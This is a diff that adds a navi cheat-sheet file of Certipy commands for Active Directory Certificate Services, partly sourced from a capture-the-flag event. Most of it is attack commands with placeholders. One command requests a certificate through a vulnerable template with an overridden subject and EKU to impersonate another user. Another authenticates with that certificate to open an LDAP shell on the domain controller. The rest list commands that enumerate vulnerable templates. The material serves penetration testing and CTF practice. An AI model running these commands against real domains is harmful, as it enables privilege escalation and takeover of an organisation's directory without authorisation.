@@ -1,0 +1,27 @@
+% certipy, adcs, kali, windows
+@ windows-variables
+; From https://github.com/sealldeveloper/navi-cheats/
+
+# Request certificate with EKU override for privilege escalation via certificate authentication, uses template with ENROLLEE_SUPPLIES_SUBJECT to impersonate target user with Client Authentication EKU
+; from htb business ctf 2025, operative fullpwn
+certipy req -dc-ip <dc_ip> -target-ip <target_ip> -u <username>@<domain> -p '<password>' -template <vulnerable_template> -upn <target_upn> -application-policies '<client_auth_eku>'
+
+# Authenticate with certificate via SCHANNEL and spawn interactive LDAP shell for AD manipulation
+; from htb business ctf 2025, operative fullpwn
+certipy auth -pfx <certificate.pfx> -ldap-shell -dc-ip <dc_ip>
+
+# Get vulnerable certificates
+certipy find -u <username>@<domain> -p '<password>' -dc-ip <dc_ip> -vulnerable <output_option> <output_filename>
+
+# Get vulnerable & enabled certificates
+certipy find -u <username>@<domain> -p '<password>' -dc-ip <dc_ip> -vulnerable -enabled <output_option> <output_filename>
+
+# Get enabled certificates
+certipy find -u <username>@<domain> -p '<password>' -dc-ip <dc_ip> -enabled <output_option> <output_filename>
+
+# Get all certificates
+certipy find -u <username>@<domain> -p '<password>' -dc-ip <dc_ip> <output_option> <output_filename>
+
+$ output_option: echo -e "-stdout\n-output"
+$ output_filename: if [[ "<output_option>" == "-stdout" ]]; then echo ""; fi
+
